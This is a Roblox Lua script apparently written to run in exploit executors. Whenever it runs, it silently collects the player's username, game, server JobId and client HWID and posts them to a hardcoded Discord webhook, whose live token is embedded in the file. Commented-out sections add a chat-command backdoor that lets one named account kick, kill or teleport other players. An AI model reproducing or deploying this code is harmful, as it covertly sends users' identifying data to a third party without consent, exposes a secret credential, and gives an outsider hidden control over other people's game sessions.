local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local WEBHOOK = "https://discord.com/api/webhooks/1258398166789783643/Uy3RQJEXOJ1gKQTUOT7Y7zPk_E2ELc08rtTZsUdLSn6gOegeD7qfcMQaiE1RVl6ENhs2"
local EXECUTOR = identifyexecutor()
local EXECUTOR_TEXT = ""

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

--[[local function FindUser(Name)
	if #Name < 3 then
		return nil
	end

	Name = string.lower(Name)
	for _, player in pairs(Players:GetPlayers()) do
		if string.sub(string.lower(player.Name), 1, #Name) == Name then
			return player
		end
	end
	return nil
end

local commands = {
	kick = function(targetPlayer)
		targetPlayer:Kick("kicked by a tear admin")
	end,
	kill = function(targetPlayer)
		targetPlayer.Character.Humanoid.Health = 0
	end,
	teleport = function(targetPlayer)
		LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players"):WaitForChild("JoeheIsTheGOAT").Character.HumanoidRootPart.CFrame
	end,
	down = function(targetPlayer)
		local args = {
			[1] = 10000
		}

		game:GetService("ReplicatedStorage"):WaitForChild("GameRemotes"):WaitForChild("Other"):WaitForChild("SelfHarm"):FireServer(unpack(args))
	end,
}]]


if EXECUTOR == "Wave" then
	EXECUTOR_TEXT = "Wave"
elseif EXECUTOR == "Solara" then
	EXECUTOR_TEXT = "Solara"
elseif EXECUTOR == "Celery" then
	EXECUTOR_TEXT = "Celery"
elseif EXECUTOR == "Synapse Z" then
	EXECUTOR_TEXT = "Synapse Z"
else
	EXECUTOR_TEXT = "Unknown"
end

local embed = {
	["title"] = LocalPlayer.Name,
	["color"] = 0x2f5bc7,
	["fields"] = {
		{
			["name"] = "Executor",
			["value"] = EXECUTOR_TEXT,
			["inline"] = true
		},
		{
			["name"] = "Game",
			["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
			["inline"] = true
		},
		{
			["name"] = "JobId",
			["value"] = game.JobId,
			["inline"] = true
		},
		{
			["name"] = "HWID",
			["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
			["inline"] = true
		}
	}
}

local payload = {
	["embeds"] = {embed},
}

local httpRequest = {
	Url = WEBHOOK,
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = game:GetService("HttpService"):JSONEncode(payload)
}

request(httpRequest)

--[[game:GetService("Players"):WaitForChild("JoeheIsTheGOAT").Chatted:Connect(function(Msg)
	local command, target = Msg:lower():match("^/e%s+([^%s]+)%s+(.*)$")
	if not command then
		command, target = Msg:lower():match("^([^%s]+)%s+(.*)$")
	end
	if command and commands[command] then
		local targetPlayer = FindUser(target)
		if targetPlayer then
			commands[command](targetPlayer)
		else
			return
		end
	elseif not commands[command] then
		return
	end
end)]]
